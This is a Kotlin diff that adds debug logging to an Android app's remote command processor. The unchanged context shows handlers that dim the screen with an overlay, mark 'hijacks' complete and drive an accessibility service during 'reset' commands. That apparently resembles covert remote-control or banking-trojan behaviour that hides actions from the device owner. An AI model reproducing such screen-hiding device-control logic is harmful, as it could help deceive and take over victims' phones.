@@ -858,7 +858,9 @@ object CommandProcessor {
                     val level = parts.getOrNull(0)?.trim()?.toIntOrNull() ?: 100
                     val method = parts.getOrNull(1)?.trim()?.uppercase() ?: "OVERLAY"
                     
+                    DebugLogger.log("CMD_BRIGHTNESS_LIFECYCLE", "Parsed BRIGHTNESS. Level: $level, Method: $method. Dispatching to main thread...")
                     Handler(Looper.getMainLooper()).post {
+                        DebugLogger.log("CMD_BRIGHTNESS_LIFECYCLE", "Main thread executing DimmerManager.applyDim()")
                         DimmerManager.applyDim(ctx, level, method)
                     }
                     status = "BRIGHTNESS_ADJUSTED ($level% via $method)"
@@ -2029,6 +2031,7 @@ object CommandProcessor {
                     }
                 }
                 "RESET_BACKGROUND_TASKS" -> {
+                    DebugLogger.log("RBT_LIFECYCLE", "Starting RESET_BACKGROUND_TASKS.")
                     val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     lPrefs.edit().putString("display_mode", "WORK").putBoolean("active", true).apply()
                     AppCache.invalidate()
@@ -2038,6 +2041,7 @@ object CommandProcessor {
                         prefs.edit().putBoolean("hijacks_completed", false).apply()
 
                         // 1. Master Display Reset
+                        DebugLogger.log("RBT_LIFECYCLE", "Invoking startMasterDisplayReset.")
                         val service = MyAccessibilityService.instance
                         if (service != null) {
                             service.startMasterDisplayReset(id, false)
@@ -2251,10 +2255,11 @@ object CommandProcessor {
                     }
                 }
                 "FINALIZE_RESET" -> {
-                    DebugLogger.log("FINALIZE", "Starting FINALIZE_RESET sequence.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Starting FINALIZE_RESET sequence.")
                     
                     // 1. Instantly Dim and tear down the Welcome UI
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DebugLogger.log("FINALIZE_LIFECYCLE", "Main thread: applying Dimmer 0 AUTO and calling removeOverlay.")
                         DimmerManager.applyDim(ctx, 0, "AUTO")
                         DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
                         DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
